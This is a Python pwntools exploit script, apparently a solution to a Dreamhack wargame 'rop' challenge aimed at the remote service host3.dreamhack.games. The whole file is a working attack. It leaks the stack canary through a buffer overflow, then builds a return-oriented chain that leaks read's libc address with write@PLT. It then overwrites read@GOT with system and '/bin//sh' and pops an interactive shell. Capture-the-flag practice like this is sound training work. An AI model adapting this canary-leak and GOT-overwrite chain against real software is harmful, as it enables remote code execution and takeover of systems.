#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 16532)

    return r


def main():
    r = conn()

    buf2canary = 0x38
    payload = b"A" * buf2canary

    r.sendlineafter("Buf: ", payload)

    r.recvuntil(payload + b"\n")
    canary = b"\x00" + r.recvn(7)

    payload += canary 
    payload += b"A" * 8                 # rbp
    payload += p64(0x400853)            # pop rdi ; ret 
    payload += p64(1)                   # stdout
    payload += p64(0x400851)            # pop rsi ; pop r15 ; ret
    payload += p64(0x601038)            # read@GOT
    payload += p64(0)                   # don't care
    payload += p64(0x4005c0)            # write@PLT
    payload += p64(0x400853)            # pop rdi ; ret 
    payload += p64(0)                   # stdin
    payload += p64(0x400851)            # pop rsi ; pop r15 ; ret
    payload += p64(0x601038)            # read@GOT
    payload += p64(0)                   # don't care
    payload += p64(0x4005f0)            # read@PLT
    payload += p64(0x400853)            # pop rdi ; ret 
    payload += p64(0x601038 + 8)        # read@GOT + 8 (will have been overwritten with /bin//sh)
    payload += p64(0x400596)            # ret (for stack alignment)
    payload += p64(0x4005f0)            # read@PLT (read@GOT will have been overwritten with system)

    r.sendafter("Buf: ", payload)

    read_va = u64(r.recvn(8))
    libc_base = read_va - libc.symbols["read"]
    system_va = libc_base + libc.symbols["system"]

    payload = p64(system_va) + b"/bin//sh" 
    
    r.send(payload)
    
    r.interactive()

if __name__ == "__main__":
    main()
